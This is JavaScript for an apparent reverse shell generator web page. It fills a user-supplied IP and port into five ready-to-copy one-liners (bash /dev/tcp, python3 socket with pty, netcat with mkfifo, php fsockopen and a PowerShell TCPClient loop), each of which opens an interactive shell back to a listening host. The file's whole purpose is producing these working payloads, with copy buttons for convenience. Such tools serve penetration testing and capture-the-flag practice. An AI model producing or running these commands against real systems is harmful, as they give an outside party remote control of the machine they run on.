(function(){
  const ipEl = document.getElementById('ip');
  const portEl = document.getElementById('port');
  const out = document.getElementById('genOut');

  const templates = [
    ['bash',       (ip,p)=>`bash -i >& /dev/tcp/${ip}/${p} 0>&1`],
    ['python3',    (ip,p)=>`python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`],
    ['nc mkfifo',  (ip,p)=>`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f`],
    ['php',        (ip,p)=>`php -r '$sock=fsockopen("${ip}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`],
    ['powershell', (ip,p)=>`powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`]
  ];

  // sanitize: strip characters with no business in a hostname/port so the
  // generated commands can never be turned into markup (defense in depth —
  // everything below is also inserted via textContent, never innerHTML).
  function cleanIp(v){ return (v || '10.10.10.10').trim().replace(/[^a-zA-Z0-9.:_-]/g, '').slice(0, 64) || '10.10.10.10'; }
  function cleanPort(v){ return (v || '4444').trim().replace(/[^0-9]/g, '').slice(0, 5) || '4444'; }

  function render(){
    const ip = cleanIp(ipEl.value);
    const port = cleanPort(portEl.value);
    out.textContent = '';

    templates.forEach(([tag, fn])=>{
      const code = fn(ip, port);

      const row = document.createElement('div');
      row.className = 'gen-row';

      const head = document.createElement('div');
      head.className = 'gen-row-head';

      const tagEl = document.createElement('span');
      tagEl.className = 'tag';
      tagEl.textContent = tag;

      const btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'copy-btn';
      btn.textContent = 'copy';
      btn.addEventListener('click', ()=>{
        navigator.clipboard?.writeText(code).catch(()=>{});
        btn.textContent = 'copied ✓';
        btn.classList.add('is-copied');
        setTimeout(()=>{ btn.textContent = 'copy'; btn.classList.remove('is-copied'); }, 1000);
      });

      head.append(tagEl, btn);

      const codeEl = document.createElement('code');
      codeEl.textContent = code;

      row.append(head, codeEl);
      out.appendChild(row);
    });
  }

  ipEl.addEventListener('input', render);
  portEl.addEventListener('input', render);
  render();
})();
